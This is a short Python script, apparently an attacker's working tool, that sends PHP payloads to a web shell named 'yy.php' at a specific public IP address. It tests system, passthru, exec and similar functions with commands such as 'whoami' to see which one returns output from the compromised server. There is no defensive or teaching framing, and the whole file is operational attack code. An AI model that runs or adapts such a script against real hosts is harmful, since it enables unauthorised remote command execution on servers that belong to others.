#!/usr/bin/env python3
"""诊断 v2: 找能输出的方式"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=30)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

tests = [
    ("print_r", "print_r('PRR_777');"),
    ("var_dump", "var_dump('VD_888');"),
    ("system whoami", "system('whoami');"),
    ("system+echo", "system('echo SYS_ECHO_999');"),
    ("system+echo2", "system('echo SYS2');echo 'PHP_AFTER';"),
    ("passthru", "passthru('whoami');"),
    ("exec", "echo exec('whoami');"),
    ("system多个", "system('whoami & ver');"),
]
for name, code in tests:
    r = cmd(code)
    print(f"--- {name} ---")
    print("  out:", repr(r.strip()[-120:]))
